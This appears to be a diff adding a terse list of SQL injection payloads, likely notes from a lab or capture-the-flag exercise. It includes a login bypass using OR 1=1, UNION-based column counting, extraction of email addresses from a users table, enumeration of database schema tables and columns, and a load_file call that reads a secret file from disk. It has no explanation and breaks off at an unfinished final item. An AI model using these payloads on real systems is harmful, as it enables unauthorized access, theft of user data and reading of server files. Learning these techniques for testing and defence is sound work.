@@ -1,0 +1,17 @@
+1. strin la user=  invalid' OR 1=1 LIMIT 1#
+
+2. 1 order by 5;
+
+3. 1 union select 1,2,3,4,5
+
+4. 1 union select null,email,null,null,null from users ; --
+
+5. 1 union select null,table_name,null,null,null from information_schema.tables; --
+
+6. 1 union select null,column_name,null,null,null from information_schema.columns where table_name = 'user'; --
+
+7. 1 union select null,email,null,null,null from users ; --
+
+8. 1 union select null,load_file("c:\\secret.txt"),null,null,null ; --
+
+9. 1
